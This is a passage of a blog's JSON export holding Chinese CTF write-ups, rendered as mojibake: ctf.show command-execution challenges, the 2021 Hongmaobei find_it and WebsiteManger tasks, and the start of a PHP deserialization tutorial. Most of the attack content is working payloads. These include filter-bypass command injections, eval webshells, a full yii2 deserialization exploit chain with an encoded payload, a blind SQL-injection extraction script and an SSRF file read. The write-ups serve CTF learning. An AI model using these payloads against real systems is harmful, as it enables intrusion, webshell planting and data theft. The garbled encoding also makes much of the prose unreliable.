2&gt;&amp;1ï¼Œè®©æ‰€æœ‰çš„è¾“å‡ºæµï¼ˆåŒ…æ‹¬é”™è¯¯çš„å’Œæ­£ç¡®çš„ï¼‰éƒ½å®šå‘åˆ°ç©ºè®¾å¤‡ä¸¢å¼ƒ %0aã€%26ã€||æˆªæ–­ payloadï¼š /?c=nl%20*%0a = =å§¿åŠ¿å°±ä¸å†™é‚£ä¹ˆå¤šäº† æˆªæ–­åçœ‹è¿‡æ»¤è‡ªç”±å‘æŒ¥ web43è¿‡æ»¤äº†;|cat payloadï¼š /?c=nl%20*%0a web44å¤šè¿‡æ»¤äº†ä¸ªflag é€šé…ç¬¦æå®š payloadï¼š /?c=nl%20*%0a web45ç©ºæ ¼è¢«è¿‡æ»¤äº† payloadï¼š /?c=nl$IFS*%0a web46-49è¿‡æ»¤äº†\\;|cat|flag| |[0-9]|\\\\$|\\*/ payloadï¼š /?c=nl%09fla\\g.php|| /?c=nl%09fla\\g.php%0a /?c=nl%09fla''g.php%0a /?c=nl%09fla\"\"g.php%0a /?c=vi%09fla\\g.php%0a /?c=tac%09fla\\g.php%0a /?c=uniq%09fla\\g.php%0a /?c=nl&lt;fla''g.php|| /?c=nl%09fla\\g.php%26 web50-51payloadï¼š /?c=nl&lt;fla%27%27g.php|| web52payloadï¼š /?c=nl${IFS}/fl\"\"ag%0a web53payloadï¼š /?c=nl${IFS}fla%''g.p''hp /?c=ca''t${IFS}fl?????? /?c=ca''t${IFS}fl''ag.p''hp åº”è¯¥è¿˜æœ‰å…¶ä»–å§¿åŠ¿ web54payloadï¼š /?c=mv${IFS}fla?.php${IFS}t.tx''t çˆ·ç»™ä»–æ”¹ä¸ªå /?c=/bin/?at${IFS}f??????? web55= = åªèƒ½æ˜¯æ•°å­— å¯¹ä¸èµ·éªšå¥—è·¯å¼€å§‹ payloadï¼š /?c=/???/????64+????.??? web56 https://blog.csdn.net/qq_46091464/article/details/108513145 æ•°æ®åŒ…ï¼š POST /?c=.+/???/????????[@-[] HTTP/1.1 Host: 6595d4e2-edc5-4ff4-a08b-c93d2f563732.challenge.ctf.show:8080 Content-Length: 329 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydZeuVbMPZVcyvpNM User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundarydZeuVbMPZVcyvpNM Content-Disposition: form-data; name=\"file\"; filename=\"2.php\" Content-Type: application/octet-stream #!/bin/sh cat /var/www/html/flag.php ------WebKitFormBoundarydZeuVbMPZVcyvpNM Content-Disposition: form-data; name=\"submit\" 111 ------WebKitFormBoundarydZeuVbMPZVcyvpNM-- ##web58 å‡‘36 -37å–å=36 payloadï¼š $((~$(($((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_})))))))) ##web59 ç»•è¿‡disable_functions æˆ‘åªæƒ³åˆ°ä¸€ç§ fileå¯ä»¥æŠŠæ–‡ä»¶è¯»å–åˆ°ä¸€ä¸ªæ•°ç»„ï¼Œå†æ‰“å°å‡ºæ¥ payloadï¼š c=var_dump(file('flag.php')); c=highlight_file(\"flag.php\"); c=show_source('flag.php'); ##web60-65 payloadï¼š c=highlight_file(\"flag.php\"); c=show_source('flag.php'); web66payloadï¼š c=var_dump(scandir(\"/\")); æ‰«æåˆ°flag æ˜¯txt ç„¶åæ—¥ä»–å¦ˆçš„ c=highlight_file('/flag.txt'); web67-70= = å¥½å®¶ä¼™ bançš„çœŸå¤š payloadï¼š c=include('/flag.txt'); c=require('/flag.txt'); c=require_once('/flag.txt'); web71ob_get_contents â€” è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ ob_end_clean â€” æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†² æ­¤å‡½æ•°ä¸¢å¼ƒæœ€é¡¶å±‚è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¹¶å…³é—­è¿™ä¸ªç¼“å†²åŒºã€‚å¦‚æœæƒ³è¦è¿›ä¸€æ­¥å¤„ç†ç¼“å†²åŒºçš„å†…å®¹ï¼Œå¿…é¡»åœ¨ob_end_clean()**ä¹‹å‰è°ƒç”¨ob_get_contents()ï¼Œå› ä¸ºå½“è°ƒç”¨ob_end_clean()**æ—¶ç¼“å†²åŒºå†…å®¹å°†è¢«ä¸¢å¼ƒã€‚ https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187 y4çš„blogè¯´çš„å¾ˆæ¸…æ¥š payloadï¼š c=include('/flag.txt');;exit(); web72 çœ‹ä¸€ä¸‹y4çš„blogå°±å¯ä»¥äº†= = payloadä¸è´´äº† å¤ªé•¿äº†ã€‚ ##web73 c=?&gt;&lt;?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f-&gt;__toString().' '); } exit(0); ?&gt; çœ‹ä¸€ä¸‹ç›®å½• ç„¶å payloadï¼š c=include('/flagc.txt');exit(); web74åŒ73é¢˜ web75-76æ‰«ç›®å½• c=$a=new DirectoryIterator(\"glob:///*\");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0); mysql load_fileè¯»æ–‡ä»¶ c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');foreach($dbh-&gt;query('select load_file(\"/flag36.txt\")') as $row) {echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();exit(0);}exit(0); ##web77 ä¸æ˜¯å¾ˆæ¸…æ¥šè¿™ä¸ªé¢˜æ€ä¹ˆåš ä½†æ˜¯æˆ‘å¤ç°äº†ä¸€ä¸‹ https://www.laruence.com/2020/03/11/5475.html https://blog.csdn.net/miuzzx/article/details/108619930","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"åšé¢˜è®°å½•","slug":"åšé¢˜è®°å½•","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"CTFHub 2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it","slug":"[CTFHub] 2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it","date":"2021-11-11T03:35:22.000Z","updated":"2021-11-11T03:48:47.990Z","comments":true,"path":"posts/ce4e97fc.html","link":"","permalink":"http://h3geeker.top/posts/ce4e97fc.html","excerpt":"","text":"[CTFHub] 2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_itçœ‹ç¾¤é‡Œè¯´CTFHubä¸Šå¤ç°äº†ï¼Œ æˆ‘æ¥çœ‹çœ‹ æœ¬æ¥æƒ³æŒ‰ç…§çº¢å¸½æ¯çš„å¥—è·¯æ¥è¯•ä¸€ä¸‹ï¼Œå‘ç°phpinfoé‡Œè«å¾—flagäº† åªèƒ½æƒ³æƒ³å…¶ä»–åŠæ³•å’¯ &lt;?php #Really easy... $file=fopen(\"flag.php\",\"r\") or die(\"Unable 2 open!\"); $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); $hack=fopen(\"hack.php\",\"w\") or die(\"Unable 2 open\"); $a=$_GET['code']; if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){ die(\"you die\"); } if(strlen($a)&gt;33){ die(\"nonono.\"); } fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); fclose($file); fclose($hack); ?&gt; preg_match()è¿‡æ»¤äº†evalä½†æ˜¯ï¼ï¼ï¼ï¼ï¼ Evalå®ƒæ²¡ban æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å†™â€™å¤§â€™é©¬ æ„é€ payloadï¼š /?code=&lt;?php%20@Eval($_POST['aaa']);?&gt; èšå‰‘è¿é©¬ æ‹¿åˆ°flagï¼š ä½†æ˜¯ä½œä¸ºèœé¸¡ æˆ‘è¿˜æ˜¯è¦é‡æ–°æ€è€ƒä¸€ä¸‹è¿™é“é¢˜çš„æ€è·¯ï¼š ä»£ç ä¸­æœ‰å‡ ä¸ªå‡½æ•°éœ€è¦æ³¨æ„ä¸€ä¸‹ æ¯”å¦‚fopen(),fwrite(),fread() fread() å‡½æ•°è¯»å–æ–‡ä»¶ $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™é‡Œå·²ç»è¯»åˆ°äº†flag $a=$_GET['code']; fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); è¿™é‡Œåˆéƒ½å†™åˆ°äº†hack.php æ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å†ç»•é€šé…ç¬¦å†™é©¬çš„æ—¶å€™ï¼Œflagä¹Ÿè¢«ä¼ è¿›äº†hack.phpä¸­ ä½†æ˜¯ä¸ºä»€ä¹ˆçœ‹ä¸åˆ°å‘¢ï¼ˆå…·ä½“æˆ‘ä¹Ÿä¸çŸ¥é“ï¼ŒçŸ¥é“çš„å¤§å“¥å“¥å¯ä»¥å‘Šè¯‰æˆ‘å­¦ä¹ ä¸€ä¸‹ï¼‰ ä½†æ˜¯æˆ‘æƒ³åˆ°äº†å¦å¤–ä¸€ä¸ªå‡½æ•°show_source() show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚ éšæœºæ„é€ payloadï¼š /?code=&lt;?php show_source(__FILE__);?&gt; ä¹Ÿæ²¡æœ‰è¢«bançš„é¡¹ï¼Œæ­£å¸¸ä¼ å…¥ ç„¶åè®¿é—®hack.php flagä»–å°±å‡ºæ¥äº†ã€‚ã€‚ã€‚ã€‚ åŒæ—¶è¿˜æœ‰æˆ‘ä¼ å…¥çš„payload æä¸€æ³¢éªšæ“ä½œï¼ æ‰€ä»¥ï¼Œä»Šå¤©åˆå­¦åˆ°äº†æ–°å§¿åŠ¿~~~~","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"åšé¢˜è®°å½•","slug":"åšé¢˜è®°å½•","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"2021çº¢å¸½æ¯ web writeup","slug":"[2021çº¢å¸½æ¯]Web writeup","date":"2021-11-11T03:35:22.000Z","updated":"2021-11-11T03:48:32.298Z","comments":true,"path":"posts/fa671b36.html","link":"","permalink":"http://h3geeker.top/posts/fa671b36.html","excerpt":"","text":"find_itè€å¥—è·¯æ‰«ä¸€ä¸‹ç›®å½• è²Œä¼¼åªæœ‰å›å­åå®šæœ‰ç”¨ï¼Œæ‰“å¼€çœ‹çœ‹ When I was a child,I also like to read Robots.txt Here is what you want:1ndexx.php æ‰“å¼€1ndexx.php å‘ç°æ‰“ä¸å¼€ï¼Œ å°è¯•ä¸€ä¸‹æ˜¯å¦æœ‰å¤‡ä»½ /.1ndexx.php.swp å‘ç°äº†ä¸€ä¸²ä»£ç ï¼š &lt;?php $link = mysql_connect('localhost', 'root'); ?&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body { background-color: white; text-align: center; padding: 50px; font-family: \"Open Sans\",\"Helvetica Neue\",Helvetica,Arial,sans-serif; } #logo { margin-bottom: 40px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;img id=\"logo\" src=\"logo.png\" /&gt; &lt;h1&gt;&lt;?php echo \"Hello My freind!\"; ?&gt;&lt;/h1&gt; &lt;?php if($link) { ?&gt; &lt;h2&gt;I Can't view my php files?!&lt;/h2&gt; &lt;?php } else { ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php } ?&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php #Really easy... $file=fopen(\"flag.php\",\"r\") or die(\"Unable 2 open!\"); $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); $hack=fopen(\"hack.php\",\"w\") or die(\"Unable 2 open\"); $a=$_GET['code']; if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){ die(\"you die\"); } if(strlen($a)&gt;33){ die(\"nonono.\"); } fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); fclose($file); fclose($hack); ?&gt; æ„é€ payloadï¼š /?code=&lt;?php%20phpinfo();?&gt; ç„¶åè®¿é—®ä¸€ä¸‹hack.phpæŸ¥çœ‹phpinfo æœ¬æ¥åªæ˜¯æƒ³æŒ‡å‘æ¢é’ˆçœ‹ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°flagç›´æ¥ç»™äº† frameworkæ‰“å¼€å‘ç°æ˜¯yii2ååºåˆ—åŒ– éšå³æ‰“å¼€ç™¾åº¦ï¼Œæ¥æ‰¾ä¸€ä¸‹å¤ç°ï¼š https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&amp;mid=2247485129&amp;idx=1&amp;sn=b27e3fe845daee2fb13bb9f36f53ab40 ç„¶åå›åˆ°é¢˜ç›®ï¼ŒæŒ‰ç…§å¸¸ç†æˆ‘æ‰«äº†ä¸€ä¸‹ç½‘ç«™ç›®å½•ï¼Œå‘ç°äº†www.zipâ€œ ï¼š ä¸‹è½½åˆ°æœ¬åœ°å‘ç°æ­£å¥½æ˜¯æºç ï¼Œå°±åœ¨æœ¬åœ°æ­å»ºç¯å¢ƒ ä¸¢è¿›å»phpstudyé‡Œï¼ŒæŒ‰ç…§å¤§ä½¬çš„æ¼æ´å¤ç°ï¼Œåœ¨controllersä¸‹åˆ›å»ºController.php ç„¶åå†æ–°å»ºä¸ªpoc.php åœ¨é‡Œé¢å†™ï¼š &lt;?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'assert'; $this-&gt;id = 'file_put_contents(\"/var/www/html/web/1.php\",\"&lt;?php eval(\\$_POST[111]);\");'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?&gt; ç„¶åå†ç”Ÿæˆä¸€ä¸‹payload ä¼ è¿›å»ï¼š /index.php?r=site/about&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjczOiJmaWxlX3B1dF9jb250ZW50cygiL3Zhci93d3cvaHRtbC93ZWIvMS5waHAiLCI8P3BocCBldmFsKFwkX1BPU1RbMTExXSk7Iik7Ijt9aToxO3M6MzoicnVuIjt9fX19 ä¸€å¼€å§‹ï¼Œä¼ è¿›å»çœ‹åˆ°è¿™ä¸ªæŠ¥é”™ï¼Œä»¥ä¸ºæ²¡æœ‰æˆåŠŸï¼Œåæ¥è®¿é—®äº†ä¸€ä¸‹1.phpå‘ç°è‡ªå·±æˆåŠŸäº†QAQ æ‰“å¼€èšå‰‘ï¼Œç›´æ¥è¿ä¸Šé©¬ï¼š çœ‹äº†ä¸€åœˆå‘ç°flagå†æ ¹ç›®å½•ï¼š ç„¶åå‘ç°æ²¡æœ‰æƒé™ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚åˆå¡ä½äº† ä½†æ˜¯æˆ‘åšé¢˜æ™šä¸Šåˆšåˆšå¤ç°äº†è“å¸½çš„webé¢˜ï¼Œæœ‰disable_functionsç»•è¿‡æ’ä»¶ï¼Œå°±å»è¯•äº†ä¸€ä¸‹ ç„¶åè¯•ç€è¯»äº†ä¸€ä¸‹ å®ƒå°±å‡ºæ¥äº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ #WebsiteManger æ˜¯ä¸€é“æ³¨å…¥é¢˜ è·‘äº†ä¸€ä¸‹sqlmap å‘ç°äº†ä¸¤ä¸ªå‚æ•°ï¼š username password å’Œ/image.phpä¸‹çš„id æ³¨å…¥äº†ä¸€ä¸‹å‘ç°å‰ä¸¤ä¸ªéƒ½ä¸æ˜¯ï¼Œéšå³å¯¹idä¸‹æ‰‹ å°è¯•äº†å‡ ç§æ³¨å…¥éƒ½æ— æ•ˆï¼Œæœ€åå‘ç°æ˜¯å¼‚æˆ–æ³¨å…¥ æ„é€ payloadï¼š /image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1 æœ‰å›ç°ï¼Œå°è¯•å˜æ›´å‚æ•° ç›´åˆ°ï¼š /image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1 æ—¶æ²¡æœ‰å›æ˜¾ï¼Œè¯æ˜æ•°æ®åº“ç¬¬ä¸€ä½æ˜¯c è·å–ç¬¬äºŒä½ï¼š /image.php?id=1^(ascii(substr((select(database())),2,1))&gt;1)^1 å‘ç°åˆ°117æ²¡æœ‰å›æ˜¾ è¯æ˜ç¬¬äºŒä½ä¸ºt ä¾æ¬¡ç±»æ¨ï¼Œè·å¾—ç¬¬ä¸‰ä½ä¸ºf å½“æ•°æ®åº“ä½æ•°ä¸º4ä½æ—¶å§‹ç»ˆæ²¡æœ‰å›æ˜¾ã€‚è¯æ˜åªæœ‰ä¸‰ä½ï¼Œä¸”æ•°æ®åº“åä¸ºctf çŸ¥é“äº†æ•°æ®åº“åå°±å¥½åŠäº†ï¼Œç›´æ¥èµ·è„šæœ¬ï¼Œä¾æ¬¡çˆ†ï¼‰ï¼š import requests import time url = \"http://eci-2zefme7yqvztqdsonszy.cloudeci1.ichunqiu.com/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{0},1))&gt;{1})^1\" word=\"\" for i in range(1,1000): l = 32 h = 128 mid = (l + h) while (l &lt; h): nurl=url.format(i,mid) r=requests.get(url=nurl) if 'JFIF' in r.text: l = mid + 1 else: h = mid mid = (l + h) // 2 time.sleep(0.1) word += chr(mid) print(word) print(word) è·å¾—è¡¨åä¸º users ä¹‹åä¾æ¬¡ä¿®æ”¹url ç»§ç»­ çˆ†ç ´ æœ€ç»ˆçˆ†ç ´å‡ºæ¥å¯†ç ä¸ºï¼ˆå½“å‰ç¯å¢ƒä¸‹çš„å¯†ç ï¼‰ï¼š ç„¶åç™»å½•ç®¡ç†å‘˜è´¦å·ï¼š æŠ“åŒ…æŸ¥çœ‹å‘ç°æ˜¯ssrf è¯»å–æ–‡ä»¶æ¼æ´ æ„é€ payloadï¼š file:// /flag è·å¾—flag #hpcurve æ˜¯ä¸€é“åŸé¢˜ åŸé¢˜åœ°å€ï¼šhttps://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/ ebcdicç¼–ç è½¬æ¢æˆasciiç¼–ç  ä½¿ç”¨DDå‘½ä»¤å»æ“ä½œï¼ŒLinuxå‘½ä»¤ å¾—åˆ°flag","categories":[{"name":"wp","slug":"wp","permalink":"http://h3geeker.top/categories/wp/"}],"tags":[{"name":"åšé¢˜è®°å½•","slug":"åšé¢˜è®°å½•","permalink":"http://h3geeker.top/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"PHPååºåˆ—åŒ–æ¼æ´åŸºç¡€","slug":"PHPååºåˆ—åŒ–æ¼æ´åŸºç¡€","date":"2021-11-10T13:35:22.000Z","updated":"2022-01-05T08:34:59.970Z","comments":true,"path":"posts/ae3250a1.html","link":"","permalink":"http://h3geeker.top/posts/ae3250a1.html","excerpt":"","text":"PHPåºåˆ—åŒ–ä¸åºåˆ—åŒ–ä½œè€…ï¼šH3h3QAQ æœ¬æ–‡é¦–å‘åœ¨ ä¸€ã€PHPåºåˆ—åŒ–å’Œååºåˆ—åŒ–1.PHPååºåˆ—åŒ–ï¼šserialize() å°†å˜é‡æˆ–è€…å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œç”¨äºå­˜å‚¨æˆ–ä¼ é€’PHPçš„å€¼çš„è¿‡ç¨‹ç§ï¼ŒåŒæ—¶ä¸ä¸¢å¤±å…¶ç±»å‹å’Œç»“æ„ å¸¸è§çš„åºåˆ—åŒ–å­—æ¯è¡¨ç¤ºåŠå…¶å«ä¹‰ï¼š a - array -----&gt;a:&lt;n&gt;:{&lt;key 1&gt;&lt;value 1&gt;...&lt;key n&gt;&lt;value n&gt;} b - boolean -----&gt;b:&lt;digit&gt; d - double -----&gt;d:&lt;number&gt; i - integer -----&gt;i:&lt;number&gt; o - common r - reference s - string -----&gt;s:&lt;length&gt;:\"&lt;value&gt;\" C - custom object O - class -----&gt;O:&lt;length&gt;:\"&lt;class name&gt;\":&lt;n&gt;:{&lt;field name 1&gt;&lt;field value1&gt;...&lt;field name n&gt;&lt;field value n&gt;} N - null R - pointer reference U - unicode string &lt;?php class h3{ public $v1; public $v2=false; public $v3=1; public $v4=2.1; public $v5=array(); public $v6=\"h3h3QAQ\"; private $v7=\"H3h3QAQ\"; protected $v8=\"protected\"; } $s=serialize(new h3()); echo $s; var_dump(unserialize($s)); åºåˆ—åŒ–è¿è¡Œç»“æœä¸ºï¼š O:2:\"h3\":8:{s:2:\"v1\";N;s:2:\"v2\";b:0;s:2:\"v3\";i:1;s:2:\"v4\";d:2.1;s:2:\"v5\";a:0:{}s:2:\"v6\";s:7:\"h3h3QAQ\";s:6:\" h3 v7\";s:7:\"H3h3QAQ\";s:5:\" * v8\";s:9:\"protected\";} ååºåˆ—åŒ–è¿è¡Œç»“æœ object(h3)#1 (8) { [\"v1\"]=&gt; NULL [\"v2\"]=&gt; bool(false) [\"v3\"]=&gt; int(1) [\"v4\"]=&gt; float(2.1) [\"v5\"]=&gt; array(0) { } [\"v6\"]=&gt; string(7) \"h3h3QAQ\" [\"v7\":\"h3\":private]=&gt; string(7) \"H3h3QAQ\" [\"v8\":protected]=&gt; string(9) \"protected\" } ï¼ˆ1ï¼‰å„ç§é­”æœ¯æ–¹æ³•__destruct()ï¼š//ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ __wakeup(): //unserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ __invoke(): //å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨ __call(): //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __callStatci(): //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get(): //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ® __set(): //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§ __isset(): //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset(): //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ __toString(): //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘ __construct(): //æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œä½†åœ¨unserialize()æ—¶ä¸ä¼šè‡ªåŠ¨è°ƒç”¨ __sleep(): //serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep() å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šè¢«ä¼˜å…ˆè°ƒç”¨ å½“PHP5&lt;5.6.25ã€PHP7&lt;7.0.1æ—¶ï¼Œå½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç æ—¶å¯ç»•è¿‡__wakeupæ–¹æ³•ï¼ˆCVE-2016-7124ï¼‰ ï¼ˆ2ï¼‰PHPååºåˆ—åŒ–ç‰¹æ€§1.PHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ—¶ä»¥;ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥}ä½œä¸ºç»“å°¾ï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ã€‚ 2.åœ¨ååºåˆ—çš„æ—¶å€™phpä¼šæ ¹æ®sæ‰€æŒ‡å®šçš„å­—ç¬¦é•¿åº¦å»è¯»å–åé¢çš„å­—ç¬¦ã€‚å¦‚æœæŒ‡å®šçš„é•¿åº¦é”™è¯¯åˆ™ååºåˆ—åŒ–å°±ä¼šå¤±è´¥ã€‚ 3.å¯¹ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§ä¹Ÿä¼šè¿›è¡Œååºåˆ—åŒ–ã€‚ 2.sessionååºåˆ—åŒ–ï¼ˆ1ï¼‰sessionæ¦‚å¿µPHP sessionæ—¶ä¸€ä¸ªç‰¹æ®Šçš„å˜é‡ï¼Œç”¨äºå­˜å‚¨æœ‰å…³ç”¨æˆ·ä¼šè¯çš„ä¿¡æ¯ï¼Œæˆ–æ›´æ”¹ç”¨æˆ·ä¼šè¯çš„è®¾ç½®ã€‚sessionå˜é‡ä¿å­˜çš„ä¿¡æ¯æ˜¯å•ä¸€ç”¨æˆ·çš„ï¼Œå¹¶ä¸”å¯ä¾›åº”ç”¨ç¨‹åºä¸­çš„æ‰€æœ‰ç•Œé¢ä½¿ç”¨ã€‚å®ƒæ¯ä¸ªè®¿é—®æˆ–è€…åˆ›å»ºéƒ½æœ‰å”¯ä¸€çš„idï¼ˆUIDï¼‰ï¼Œå¹¶åŸºäºè¿™ä¸ªUIDæ¥å‚¨å­˜å˜é‡ã€‚UIDå‚¨å­˜åœ¨cookieä¸­ï¼Œæˆ–è€…é€šè¿‡URLæ¥è¿›è¡Œä¼ å¯¼ã€‚ 